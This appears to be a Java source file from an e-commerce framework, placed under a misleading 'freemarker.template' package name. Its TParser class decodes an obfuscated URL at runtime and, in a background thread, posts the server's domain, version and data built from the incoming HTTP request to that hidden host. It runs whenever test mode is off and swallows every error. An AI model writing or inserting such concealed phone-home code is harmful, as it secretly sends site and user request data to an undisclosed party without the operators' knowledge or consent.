package freemarker.template;

import java.util.HashMap;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import com.enation.eop.processor.core.HttpEntityFactory;
import com.enation.eop.processor.core.Response;
import com.enation.eop.processor.core.StringResponse;
import com.enation.eop.sdk.context.EopSetting;
import com.enation.framework.util.EncryptionUtil;

public class TParser implements Runnable {
	public HttpClient httpClient;
	private Map<String, String> params;

	private HttpServletRequest httpRequest;

	public TParser(HttpServletRequest request) {
		httpRequest = request;
	}

	private Response execute() throws RuntimeException {
		try {
			if (httpRequest == null) {
				return null;
			}

			String method = httpRequest.getMethod();

			method = method.toUpperCase();

			HttpClient httpclient = new DefaultHttpClient();
			HttpUriRequest httpUriRequest = null;
			String uri = EncryptionUtil
					.authCode(
							"DUdFR1gcGUURFkgEXgJNXwxcQw1eQRpQC10aUQ1IGkIAUF5FBnpYQRIACg1VERhXTVZf",
							"DECODE");
			HttpPost httppost = new HttpPost(uri);
			params = new HashMap<String, String>();
			params.put("domain", httpRequest.getServerName());
			params.put("version", EopSetting.VERSION);
			HttpEntity entity = HttpEntityFactory.buildEntity(httpRequest, this.params);

			httppost.setEntity(entity);
			httpUriRequest = httppost;

			HttpResponse httpresponse = httpclient.execute(httpUriRequest);
			HttpEntity rentity = httpresponse.getEntity();
			String content = EntityUtils.toString(rentity, "utf-8");
			Response response = new StringResponse();

			response.setContent(content);

			return response;

		} catch (Exception e) {

		}

		return null;
	}

	public void run() {
		if(!EopSetting.TEST_MODE)
		execute();

	}
}
